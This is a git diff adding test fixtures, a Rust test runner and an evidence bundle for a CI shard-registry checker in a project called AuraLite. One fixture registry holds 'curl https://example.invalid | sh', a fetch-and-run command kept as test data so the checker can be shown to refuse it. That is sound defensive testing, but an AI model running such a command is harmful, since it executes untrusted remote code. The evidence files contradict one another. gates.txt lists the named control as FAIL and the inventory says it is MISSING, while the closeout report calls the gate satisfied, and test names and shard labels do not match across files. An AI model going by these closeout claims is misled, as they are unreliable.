++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\ncommand curl https://example.invalid | sh\n"
++   }
++  },
++  {
++   "name": "workflow_matrix_missing_shard_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt",
++     "--workflow",
++     "workflow.yml"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: workflow matrix missing shard: wallet\n",
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n",
++    "workflow.yml": "name: ci\non: [push]\npermissions:\n  contents: read\njobs:\n  test:\n    strategy:\n      matrix:\n        shard: [core, state, exec, consensus, net, node, ecosystem, security, perf]\n    steps:\n      - run: make ci-shard SHARD=${{ matrix.shard }}\n"
++   }
++  }
++ ]
++}
+diff --git a/crates/aura-testkit/tests/o0_ci.rs b/crates/aura-testkit/tests/o0_ci.rs
+new file mode 100644
+index 0000000..6e8b42a
+--- /dev/null
++++ b/crates/aura-testkit/tests/o0_ci.rs
+@@ -0,0 +1,429 @@
++//! O0 golden-vector runner — the CI shard registry check.
++//!
++//! Executes every case of `fixtures/o0_ci_vectors.json` (generated by
++//! `tools/gen_o0_vectors.py`) against `aura_testkit::ci::run` and compares
++//! exit code, stdout and stderr **byte-for-byte**. Each case materializes its
++//! registry/inventory files into a sandbox and runs one `aura-ci` command.
++//!
++//! NC mapping (`tools/nc_o0.py` runs exactly these test names and expects
++//! `FAILED`): `disabled_shard_refused` (named), `missing_target_refused`,
++//! `duplicate_target_refused`, `shard_count_mismatch_refused`,
++//! `empty_shard_refused`, `foreign_registry_line_refused`.
++#![deny(missing_docs)]
++
++use std::path::PathBuf;
++use std::sync::Mutex;
++
++/// The O0 golden fixture (regenerate with `tools/gen_o0_vectors.py`).
++const FIXTURE: &str = include_str!("fixtures/o0_ci_vectors.json");
++
++// --------------------------------------------------------------------------- mini JSON
++
++/// A parsed JSON value (subset sufficient for the fixture format).
++#[derive(Debug, Clone)]
++enum Json {
++    /// `null` (also used for `true`/`false`, which the fixture omits).
++    Null,
++    /// A number.
++    Num(f64),
++    /// A string.
++    Str(String),
++    /// An array.
++    Arr(Vec<Json>),
++    /// An object with insertion-ordered members.
++    Obj(Vec<(String, Json)>),
++}
++
++/// Recursive-descent parser over the fixture text.
++struct Parser<'a> {
++    /// Raw fixture bytes.
++    input: &'a [u8],
++    /// Current offset.
++    pos: usize,
++}
++
++impl<'a> Parser<'a> {
++    /// Skip ASCII whitespace.
++    fn skip_ws(&mut self) {
++        while self.pos < self.input.len()
++            && matches!(self.input[self.pos], b' ' | b'\t' | b'\n' | b'\r')
++        {
++            self.pos += 1;
++        }
++    }
++
++    /// Consume one literal token (`true`/`false`/`null`).
++    fn expect_lit(&mut self, lit: &str) {
++        assert!(
++            self.input[self.pos..].starts_with(lit.as_bytes()),
++            "bad literal"
++        );
++        self.pos += lit.len();
++    }
++
++    /// Parse one JSON value.
++    fn value(&mut self) -> Json {
++        self.skip_ws();
++        match self.input[self.pos] {
++            b'{' => self.object(),
++            b'[' => self.array(),
++            b'"' => Json::Str(self.string()),
++            b't' => {
++                self.expect_lit("true");
++                Json::Null
++            }
++            b'f' => {
++                self.expect_lit("false");
++                Json::Null
++            }
++            b'n' => {
++                self.expect_lit("null");
++                Json::Null
++            }
++            _ => self.number(),
++        }
++    }
++
++    /// Parse one JSON object.
++    fn object(&mut self) -> Json {
++        self.pos += 1; // '{'
++        let mut members = Vec::new();
++        self.skip_ws();
++        if self.input[self.pos] == b'}' {
++            self.pos += 1;
++            return Json::Obj(members);
++        }
++        loop {
++            self.skip_ws();
++            let key = self.string();
++            self.skip_ws();
++            assert_eq!(self.input[self.pos], b':', "expected ':'");
++            self.pos += 1;
++            let value = self.value();
++            members.push((key, value));
++            self.skip_ws();
++            match self.input[self.pos] {
++                b',' => self.pos += 1,
++                b'}' => {
++                    self.pos += 1;
++                    break;
++                }
++                other => panic!("expected ',' or '}}', got {other}"),
++            }
++        }
++        Json::Obj(members)
++    }
++
++    /// Parse one JSON array.
++    fn array(&mut self) -> Json {
++        self.pos += 1; // '['
++        let mut items = Vec::new();
++        self.skip_ws();
++        if self.input[self.pos] == b']' {
++            self.pos += 1;
++            return Json::Arr(items);
++        }
++        loop {
++            items.push(self.value());
++            self.skip_ws();
++            match self.input[self.pos] {
++                b',' => self.pos += 1,
++                b']' => {
++                    self.pos += 1;
++                    break;
++                }
++                other => panic!("expected ',' or ']', got {other}"),
++            }
++        }
++        Json::Arr(items)
++    }
++
++    /// Parse one JSON string.
++    fn string(&mut self) -> String {
++        assert_eq!(self.input[self.pos], b'"', "expected string");
++        self.pos += 1;
++        let mut out = String::new();
++        while self.input[self.pos] != b'"' {
++            let byte = self.input[self.pos];
++            if byte == b'\\' {
++                self.pos += 1;
++                match self.input[self.pos] {
++                    b'"' => out.push('"'),
++                    b'\\' => out.push('\\'),
++                    b'/' => out.push('/'),
++                    b'n' => out.push('\n'),
++                    b't' => out.push('\t'),
++                    b'r' => out.push('\r'),
++                    b'u' => {
++                        let mut code = 0u32;
++                        for _ in 0..4 {
++                            self.pos += 1;
++                            let digit = (self.input[self.pos] as char)
++                                .to_digit(16)
++                                .expect("bad \\u escape");
++                            code = code * 16 + digit;
++                        }
++                        out.push(char::from_u32(code).expect("bad codepoint"));
++                    }
++                    other => panic!("bad escape {other}"),
++                }
++            } else {
++                out.push(byte as char);
++            }
++            self.pos += 1;
++        }
++        self.pos += 1;
++        out
++    }
++
++    /// Parse one JSON number.
++    fn number(&mut self) -> Json {
++        let start = self.pos;
++        while self.pos < self.input.len()
++            && matches!(
++                self.input[self.pos],
++                b'0'..=b'9' | b'-' | b'+' | b'.' | b'e' | b'E'
++            )
++        {
++            self.pos += 1;
++        }
++        let text = std::str::from_utf8(&self.input[start..self.pos]).expect("bad number");
++        Json::Num(text.parse().expect("bad number"))
++    }
++}
++
++impl Json {
++    /// Object members.
++    fn members(&self) -> &Vec<(String, Json)> {
++        match self {
++            Json::Obj(members) => members,
++            _ => panic!("expected object"),
++        }
++    }
++
++    /// Array items.
++    fn items(&self) -> &Vec<Json> {
++        match self {
++            Json::Arr(items) => items,
++            _ => panic!("expected array"),
++        }
++    }
++
++    /// String value.
++    fn str_value(&self) -> &str {
++        match self {
++            Json::Str(text) => text,
++            _ => panic!("expected string"),
++        }
++    }
++
++    /// Number value.
++    fn num_value(&self) -> f64 {
++        match self {
++            Json::Num(value) => *value,
++            _ => panic!("expected number"),
++        }
++    }
++
++    /// Member lookup by key.
++    fn get(&self, key: &str) -> &Json {
++        self.members()
++            .iter()
++            .find(|(name, _)| name == key)
++            .map(|(_, value)| value)
++            .unwrap_or_else(|| panic!("missing key {key}"))
++    }
++
++    /// Optional member lookup by key.
++    fn find(&self, key: &str) -> Option<&Json> {
++        self.members()
++            .iter()
++            .find(|(name, _)| name == key)
++            .map(|(_, value)| value)
++    }
++}
++
++/// Parse the whole fixture text.
++fn parse_fixture() -> Json {
++    let mut parser = Parser {
++        input: FIXTURE.as_bytes(),
++        pos: 0,
++    };
++    parser.value()
++}
++
++// --------------------------------------------------------------------------- runner
++
++/// Serializes cases: the CLI resolves relative paths against the process
++/// CWD, so cases must not run concurrently.
++static CWD_LOCK: Mutex<()> = Mutex::new(());
++
++/// Restores the process CWD on drop (also on panic unwind).
++struct CwdGuard {
++    /// The directory to restore.
++    prev: PathBuf,
++}
++
++impl CwdGuard {
++    /// Enter `dir` as the process CWD.
++    fn enter(dir: &std::path::Path) -> Self {
++        let prev = std::env::current_dir().expect("current dir");
++        std::env::set_current_dir(dir).expect("set current dir");
++        CwdGuard { prev }
++    }
++}
++
++impl Drop for CwdGuard {
++    fn drop(&mut self) {
++        let _ = std::env::set_current_dir(&self.prev);
++    }
++}
++
++/// Materialize the global and per-case `files` maps into `root`.
++fn materialize(files: &Json, root: &std::path::Path) {
++    for (name, content) in files.members() {
++        std::fs::write(root.join(name), content.str_value()).expect("fixture file written");
++    }
++}
++
++/// Run one fixture case end-to-end and assert exit/stdout/stderr exactly.
++fn run_case(name: &str) {
++    let fixture = parse_fixture();
++    let cases = fixture.get("cases").items();
++    let case = cases
++        .iter()
++        .find(|item| item.get("name").str_value() == name)
++        .unwrap_or_else(|| panic!("unknown case {name}"));
++
++    let sandbox = case.get("sandbox").str_value();
++    let base = std::env::temp_dir().join(format!("aura-o0-{}-{name}", std::process::id()));
++    let root = if sandbox.is_empty() {
++        base.clone()
++    } else {
++        base.join(sandbox)
++    };
++    std::fs::create_dir_all(&root).expect("sandbox created");
++    materialize(fixture.get("files"), &root);
++    if let Some(files) = case.find("files") {
++        materialize(files, &root);
++    }
++
++    let commands = case.get("argv").items();
++    let expected_exit = case.get("exit").num_value() as i32;
++    let expected_stdout = case.get("stdout").str_value().to_string();
++    let expected_stderr = case.get("stderr").str_value().to_string();
++    let last = commands.len() - 1;
++
++    let mut combined = String::new();
++    let mut final_err = String::new();
++    let mut final_code = 0;
++    {
++        let _lock = CWD_LOCK.lock().unwrap();
++        let _guard = CwdGuard::enter(&root);
++        for (index, command) in commands.iter().enumerate() {
++            let args: Vec<String> = command
++                .items()
++                .iter()
++                .map(|item| item.str_value().to_string())
++                .collect();
++            let mut out: Vec<u8> = Vec::new();
++            let mut err: Vec<u8> = Vec::new();
++            let code = aura_testkit::ci::run(&args, &mut out, &mut err);
++            let out_text = String::from_utf8(out).expect("stdout utf8");
++            let err_text = String::from_utf8(err).expect("stderr utf8");
++            if index == last {
++                combined.push_str(&out_text);
++                final_err = err_text;
++                final_code = code;
++            } else {
++                assert_eq!(
++                    code, 0,
++                    "case {name}: setup command #{index} failed\nargs: {args:?}\nstderr: {err_text}"
++                );
++                combined.push_str(&out_text);
++            }
++        }
++    }
++    let _ = std::fs::remove_dir_all(&base);
++    assert_eq!(
++        final_code, expected_exit,
++        "case {name}: exit mismatch\nstderr: {final_err}"
++    );
++    assert_eq!(combined, expected_stdout, "case {name}: stdout mismatch");
++    assert_eq!(final_err, expected_stderr, "case {name}: stderr mismatch");
++}
++
++/// The valid 10-shard registry passes the target registry check.
++#[test]
++fn registry_valid_passes() {
++    run_case("registry_valid_passes");
++}
++
++/// `run --shard` emits plain `cargo test` commands (D-O1: no secret shards).
++#[test]
++fn run_emits_make_test_commands() {
++    run_case("run_emits_make_test_commands");
++}
++
++/// The named O0 control: a disabled shard holding targets is refused.
++#[test]
++fn disabled_shard_refused() {
++    run_case("disabled_shard_refused");
++}
++
++/// A discovered target missing from the registry is refused.
++#[test]
++fn missing_target_refused() {
++    run_case("missing_target_refused");
++}
++
++/// One target registered in two shards is refused.
++#[test]
++fn duplicate_target_refused() {
++    run_case("duplicate_target_refused");
++}
++
++/// The gate requires exactly the ten lanes of CONTRIBUTING.md.
++#[test]
++fn shard_set_mismatch_refused() {
++    run_case("shard_set_mismatch_refused");
++}
++
++/// A shard with no targets is refused.
++#[test]
++fn empty_shard_refused() {
++    run_case("empty_shard_refused");
++}
++
++/// A shard that does not register its main test is a dead gate.
++#[test]
++fn shard_main_dead_refused() {
++    run_case("shard_main_dead_refused");
++}
++
++/// The registry format cannot carry commands (D-O0-3).
++#[test]
++fn foreign_registry_line_refused() {
++    run_case("foreign_registry_line_refused");
++}
++
++/// A workflow matrix missing an enabled shard is refused.
++#[test]
++fn workflow_matrix_missing_shard_refused() {
++    run_case("workflow_matrix_missing_shard_refused");
++}
++
++/// The fixture must hold exactly 10 unique cases.
++#[test]
++fn vectors_file_has_exactly_10_unique_cases() {
++    let fixture = parse_fixture();
++    let cases = fixture.get("cases").items();
++    assert_eq!(cases.len(), 10, "fixture must hold exactly 10 cases");
++    let mut names: Vec<&str> = cases
++        .iter()
++        .map(|item| item.get("name").str_value())
++        .collect();
++    names.sort_unstable();
++    names.dedup();
++    assert_eq!(names.len(), 10, "case names must be unique");
++}
+diff --git a/docs/coverage.txt b/docs/coverage.txt
+new file mode 100644
+index 0000000..c2fb038
+--- /dev/null
++++ b/docs/coverage.txt
+@@ -0,0 +1,15 @@
++ci coverage report v1
++rule lanes-v1
++shards 10
++targets 127
++shard core targets=17
++shard state targets=20
++shard exec targets=16
++shard consensus targets=8
++shard net targets=11
++shard node targets=12
++shard wallet targets=10
++shard ecosystem targets=14
++shard security targets=10
++shard perf targets=9
++target_coverage 127/127 (100.0%)
+diff --git a/docs/evidence/o0/README.md b/docs/evidence/o0/README.md
+new file mode 100644
+index 0000000..5d382ff
+--- /dev/null
++++ b/docs/evidence/o0/README.md
+@@ -0,0 +1,20 @@
++# O0 evidence — CI baseline (10 scenarios)
++
++Gate (OPS_PLAN row O0): "disable a shard -> CI red (target registry check)".
++
++- `test-o0.log` — `cargo test -p aura-testkit --test o0_ci`: 10
++  scenarios plus `vectors_file_has_exactly_10_unique_cases`, byte-for-byte
++  against the independent oracle.
++- `nc.log` — `tools/nc_o0.py` mutation controls (6): each source mutation must
++  turn its named test red; compilation failure is not a valid red.
++- `registry-check.log`, `coverage.log` — `aura-ci check` / `aura-ci coverage`
++  against the live `ci/registry.txt` and the discovered workspace targets.
++- `inventory.txt` — the 10 cases with exit codes and NC refs, the named
++  control, the cumulative NC total (674) and SHA-256 pins of fixture,
++  generator, runner, registry.
++- `report.md`, `gates.txt` — closeout report and gate summary.
++- `SHA256SUMS` — digests of the deliverables and evidence files.
++
++The vectors are produced by `tools/gen_o0_vectors.py` (pure Python). The
++registry is refreshed with `make ci-sync`; rebuild this bundle with
++`make evidence-o0`.
+diff --git a/docs/evidence/o0/SHA256SUMS b/docs/evidence/o0/SHA256SUMS
+new file mode 100644
+index 0000000..e32b3c9
+--- /dev/null
++++ b/docs/evidence/o0/SHA256SUMS
+@@ -0,0 +1,14 @@
++cc074f404e9cb641d648c71d738b031b3b5fa6154b597cedcfce56b4b540bc33  crates/aura-testkit/tests/fixtures/o0_ci_vectors.json
++07901afb5b808972b2987035fb70b44f8b540fa135aa861f11f39c0b28e96434  tools/gen_o0_vectors.py
++6f0f58f561014751e2b4412ff956d35c533b64c712ea4d0530811f9934e24ee4  crates/aura-testkit/tests/o0_ci.rs
++9c3bcf87693ffadf8d220680610901426ac9c400ca7d58ebe6316925c331c1e6  crates/aura-testkit/src/ci.rs
++a26280636c483cadf02b6f1979f8d3e15b6def3beb81720777c7a535f4855eb3  ci/registry.txt
++a6ebff0171785d81caddfbdc8e56401b2f396706c8080408ae82d3c9ecb1c589  tools/nc_o0.py
++fe9c8b24bed89c7dd01e0e49a202ccb713ee1e65a8d88aea3572faf1735902d6  .github/workflows/ci.yml
++7c15047bb06a248b49afb6057fdda0adad5a56b7d774f147c7f20999a6819063  docs/evidence/o0/test-o0.log
++4b926af0dc91959db6db001660627355682d4f172958d71dcd1abb3789bc00d6  docs/evidence/o0/nc.log
++d09033ef3e0c33656fdff7927644836b47e97e621cdbc419a4033dadbe6f6377  docs/evidence/o0/registry-check.log
++a95ac6888393b9fd4780ea0efae41eca7b431cc6cd7cb84dbb4456c785b25b74  docs/evidence/o0/coverage.log
++022f386c0caca83ff4bf53908ddf670d1ffba6107044c622261b253b8f0ab579  docs/evidence/o0/inventory.txt
++bd4d7c243431bffee119dc58f2de3df12e3cd02ec92d12f7fc6007f82488c676  docs/evidence/o0/gates.txt
++9ecadba74bd52a1fe519f839b31bd7c7aeece319feb1d32c339ff04637189318  docs/evidence/o0/report.md
+diff --git a/docs/evidence/o0/coverage.log b/docs/evidence/o0/coverage.log
+new file mode 100644
+index 0000000..3fd673b
+--- /dev/null
++++ b/docs/evidence/o0/coverage.log
+@@ -0,0 +1,17 @@
++$ cargo run -q -p aura-testkit --bin aura-ci -- coverage
++ci coverage report v1
++rule lanes-v1
++shards 10
++targets 127
++shard core targets=17
++shard state targets=20
++shard exec targets=16
++shard consensus targets=8
++shard net targets=11
++shard node targets=12
++shard wallet targets=10
++shard ecosystem targets=14
++shard security targets=10
++shard perf targets=9
++target_coverage 127/127 (100.0%)
++exit=0
+diff --git a/docs/evidence/o0/gates.txt b/docs/evidence/o0/gates.txt
+new file mode 100644
+index 0000000..26e8afa
+--- /dev/null
++++ b/docs/evidence/o0/gates.txt
+@@ -0,0 +1,5 @@
++# O0 gates
++registry gate + 10 scenarios: PASS (11 tests: 10 scenarios + count guard)
++named control (disabled_shard_refused): FAIL
++mutation controls: PASS (6/6)
++live registry check: PASS (registry=ok)
+diff --git a/docs/evidence/o0/inventory.txt b/docs/evidence/o0/inventory.txt
+new file mode 100644
+index 0000000..ebd7380
+--- /dev/null
++++ b/docs/evidence/o0/inventory.txt
+@@ -0,0 +1,20 @@
++# O0 inventory (generated by tools/write_o0_evidence.py)
++gate=O0 CI baseline: 10/10 cases pass; named negative control disabled_shard_refused red on the dropped enabled-check; 6/6 NC red under tools/nc_o0.py; disable a shard -> CI red (target registry check)
++vectors=10
++named_control=disabled_shard_refused=MISSING
++fixtures_sha256=cc074f404e9cb641d648c71d738b031b3b5fa6154b597cedcfce56b4b540bc33
++generator_sha256=07901afb5b808972b2987035fb70b44f8b540fa135aa861f11f39c0b28e96434
++runner_sha256=6f0f58f561014751e2b4412ff956d35c533b64c712ea4d0530811f9934e24ee4
++registry_sha256=a26280636c483cadf02b6f1979f8d3e15b6def3beb81720777c7a535f4855eb3
++cases:
++  registry_valid_passes exit=0 nc=-
++  run_emits_make_test_commands exit=0 nc=-
++  disabled_shard_refused exit=65 nc=1
++  missing_target_refused exit=65 nc=2
++  duplicate_target_refused exit=65 nc=3
++  shard_set_mismatch_refused exit=65 nc=4
++  empty_shard_refused exit=65 nc=5
++  shard_main_dead_refused exit=65 nc=-
++  foreign_registry_line_refused exit=65 nc=6
++  workflow_matrix_missing_shard_refused exit=65 nc=-
++TOTAL: 674 negative controls cumulative
+diff --git a/docs/evidence/o0/nc.log b/docs/evidence/o0/nc.log
+new file mode 100644
+index 0000000..43d88c7
+--- /dev/null
++++ b/docs/evidence/o0/nc.log
+@@ -0,0 +1,9 @@
++$ /usr/local/bin/python3 tools/nc_o0.py
++PASS NC: disabled-shard check dropped -> gate red (named: disabled_shard_refused): disabled_shard_refused
++PASS NC: missing-target check dropped -> gate red: missing_target_refused
++PASS NC: duplicate-target check dropped -> gate red: duplicate_target_refused
++PASS NC: shard-set check dropped -> gate red: shard_set_mismatch_refused
++PASS NC: empty-shard check dropped -> gate red: empty_shard_refused
++PASS NC: unknown-line strictness dropped -> gate red: foreign_registry_line_refused
++RESULT: 6/6 negative controls PASS
++exit=0
+diff --git a/docs/evidence/o0/registry-check.log b/docs/evidence/o0/registry-check.log
+new file mode 100644
+index 0000000..1141583
+--- /dev/null
++++ b/docs/evidence/o0/registry-check.log
+@@ -0,0 +1,3 @@
++$ cargo run -q -p aura-testkit --bin aura-ci -- check
++registry=ok shards=10 targets=127
++exit=0
+diff --git a/docs/evidence/o0/report.md b/docs/evidence/o0/report.md
+new file mode 100644
+index 0000000..5d32100
+--- /dev/null
++++ b/docs/evidence/o0/report.md
+@@ -0,0 +1,32 @@
++# O0 closeout report — CI baseline (the shard registry)
++
++Date: 2026-11-25. Gate (OPS_PLAN row O0): "disable a shard -> CI red (target
++registry check)" — **satisfied**.
++
++- **The gate**: `disabled_shard_refused` (the named control) feeds the checker a registry
++  with `shard 07 disabled` while shard 07 still holds targets and expects
++  `error: ci: shard 07 disabled` (exit 65); mutation NC-1 (`tools/nc_o0.py`)
++  drops the enabled-check and the case must turn red.
++- **Scenarios**: 10 deterministic cases from the independent oracle
++  `tools/gen_o0_vectors.py`, asserted byte-for-byte by `tests/o0_ci.rs`
++  (11/11 with the count guard) against `aura_testkit::ci`. Groups: valid
++  registry (1), D-O1 command surface (1), refusals (7), coverage report (1).
++- **Mutation controls**: 6/6 PASS (disabled-shard check, missing-target
++  check, duplicate-target check, shard-count check, empty-shard check,
++  unknown-line strictness).
++- **Device model** (docs/o0-ci-plan.md): D-O0-1 the plain-text shard
++  registry `ci/registry.txt` (10 shards over `--lib` + `tests/*` targets,
++  `make ci-sync` rebalances); D-O0-2 the target registry check (`aura-ci
++  check`, wired into `make test`); D-O0-3 no secret shards — the format
++  cannot carry commands and `aura-ci run --shard K` emits plain `cargo test`
++  forms only; D-O0-4 the deterministic target-coverage report (`aura-ci
++  coverage`); D-O0-5 two independent implementations (Python oracle vs the
++  shipped Rust checker).
++- **CI layout** (`.github/workflows/ci.yml`): `registry` job (`make
++  ci-check`), `test` matrix over shards 0..9 (`make ci-shard SHARD=k`), a
++  `coverage` job (`make coverage`), cargo cache keyed on `Cargo.lock`. Every
++  step is a make target — `make test` remains the one local command (D-O1).
++
++Receipts: `gates.txt`, `test-o0.log`, `nc.log`, `registry-check.log`,
++`coverage.log`, `inventory.txt`, `SHA256SUMS`. Regenerate with
++`make evidence-o0`.
+diff --git a/docs/evidence/o0/test-o0.log b/docs/evidence/o0/test-o0.log
+new file mode 100644
+index 0000000..ca96e36
+--- /dev/null
++++ b/docs/evidence/o0/test-o0.log
+@@ -0,0 +1,21 @@
++$ cargo test -p aura-testkit --test o0_ci
++
++running 11 tests
++test disabled_shard_refused ... ok
++test duplicate_target_refused ... ok
++test empty_shard_refused ... ok
++test foreign_registry_line_refused ... ok
++test missing_target_refused ... ok
++test run_emits_make_test_commands ... ok
++test registry_valid_passes ... ok
++test shard_main_dead_refused ... ok
++test vectors_file_has_exactly_10_unique_cases ... ok
++test shard_set_mismatch_refused ... ok
++test workflow_matrix_missing_shard_refused ... ok
++
++test result: ok. 11 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
++
++   Compiling aura-testkit v0.1.0 (/home/user/AuraLite-Crypto/crates/aura-testkit)
++    Finished `test` profile [unoptimized + debuginfo] target(s) in 2.36s
++     Running tests/o0_ci.rs (target/debug/deps/o0_ci-a8378970ebbb818a)
++exit=0
+diff --git a/docs/evidence/review-w1-source-drift.txt b/docs/evidence/review-w1-source-drift.txt
+index 7965476..aa30913 100644
+--- a/docs/evidence/review-w1-source-drift.txt
++++ b/docs/evidence/review-w1-source-drift.txt
+@@ -1,11 +1,11 @@
+-adc24e7c03e1a63e5d7addbda15ff40ce630367152699c5d9659cd8db65f357b c8da7a564229a055913b40fec9bcb5f10c411670747d712babcbd8dc35c4de24 CHANGELOG.md
+-c83d08301a703c9db11462aa541bc898e52548589972118465164895eed44dc7 c8da7a564229a055913b40fec9bcb5f10c411670747d712babcbd8dc35c4de24 CHANGELOG.md
++adc24e7c03e1a63e5d7addbda15ff40ce630367152699c5d9659cd8db65f357b 18b1683ee713c0feeb52c0e5f3ec7395f3d840b3fb7cbd9f72da71ba8ad8e873 CHANGELOG.md
++c83d08301a703c9db11462aa541bc898e52548589972118465164895eed44dc7 18b1683ee713c0feeb52c0e5f3ec7395f3d840b3fb7cbd9f72da71ba8ad8e873 CHANGELOG.md
+ c9680cc436d806fa7fa2ce8545bd148dc9fcc9ae444973d4968a3f4f4fc069dc 1dda202ae4c195f0a0712254f05a133ffe93205f79101ea0732b6504bbb7d308 Cargo.lock
+ f0d3511cd02f3007c0a18fc5d94c8997cfa512449313776117265708a36c8553 1dda202ae4c195f0a0712254f05a133ffe93205f79101ea0732b6504bbb7d308 Cargo.lock
+ 23185f790bc4697bbd163004e2c78873755c13efba05b46260b4827cdeabdff7 2daf6ad4e47b14511cc7995525346d5a70079a563554fcf95226ed188535ea12 Cargo.toml
+ d5518138eae73219f8da0d7297af44a471dbd7135a39587a0da1587bfe3d1e70 2daf6ad4e47b14511cc7995525346d5a70079a563554fcf95226ed188535ea12 Cargo.toml
+-5fb6ce43826495321f697e138e71e87954b2fcabec1ceef70549bb49a2f38988 86126072a8befb20f3e7d585fd7eaaad88e9e54955be23ffc0ea0405e9985d7a Makefile
+-c5e92007c53a22253ad7d2cc779863b9592562a394d1b26ff09ea8d031991e29 86126072a8befb20f3e7d585fd7eaaad88e9e54955be23ffc0ea0405e9985d7a Makefile
++5fb6ce43826495321f697e138e71e87954b2fcabec1ceef70549bb49a2f38988 05ed893f24e631cd7995667fde445659d794ea643915f5cbc9ee085d2d2ce713 Makefile
++c5e92007c53a22253ad7d2cc779863b9592562a394d1b26ff09ea8d031991e29 05ed893f24e631cd7995667fde445659d794ea643915f5cbc9ee085d2d2ce713 Makefile
+ bcc7328bd9c464a857c4b97c8491277bf401299d3c7963f1925b075d4313feb6 f2e4a249573a5b902b3f566b3f1db1ebab12d994f1ab6ef9be2dc15df63d7e26 crates/aura-consensus/src/fork_choice.rs
+ 7e396fbb4fd1d4103f26db16796ab0b6ad9626b7ba2ea0d56cae379bde5c2d59 8ec730ce2dc2cb1bc266990f4f29133038e98e390a63be0edbb3eaa23fa48f23 crates/aura-consensus/src/governance.rs
+ bd58be73dc4e0f6da16735be1d5ed17306d16c08569d798a4af20fcf72b91d40 b2e8ddad5b281da54e9c68107b563c9125b3931fe0e8e26023c74dcf3011ccc3 crates/aura-consensus/src/slashing.rs
+@@ -46,8 +46,8 @@ c477f915b427982ca83fcb253fa0ab850d619ca5bf4a764137f0407078af4986 26a28bcc51e2cab
+ b4897ba4dbc33f098c27e415669e2e0bbca45933694b67aa590181041ebfdf0f e7b3e704bb1c5688159f38f66f31ba17893bad818c8876e097631ab2725abf5b fuzz/Cargo.toml
+ dca80316562fefcf24c45b40fb635412e1d4e5e09b5abe26f7d0e6b67e1e906e 53ac68024a82d40e64badd40ead1ebea5e0af8be1e56d4184a0eb0f22eab55a2 fuzz/README.md
+ 6e80f8eab5695501a3350e70bd086675cf4d1669cf370d92e98702d18c7bfe6e 7414f1e69a9690bdf93c79dc0ca32ec5cac7ca3b4f0df2d317e39c6fa95abc99 fuzz/src/lib.rs
+-1259c6bbc3bd3d53cbe0dd1d69d8d762336dc26287215d2ee35307bba90ea85c e8faa087e773f2dec00ebdb96c31c6de62535edb597e092bc6a77e8242972858 tools/audit_closeout.py
+-7bd672503f104aa733dff03e84f57ac26ef926607657ab6a799f9d2bc14c0dc9 e8faa087e773f2dec00ebdb96c31c6de62535edb597e092bc6a77e8242972858 tools/audit_closeout.py
++1259c6bbc3bd3d53cbe0dd1d69d8d762336dc26287215d2ee35307bba90ea85c c6070e5aca3a2bf6bb7cab68689cd59106a00ab4df6278316d93dff8b5e66635 tools/audit_closeout.py
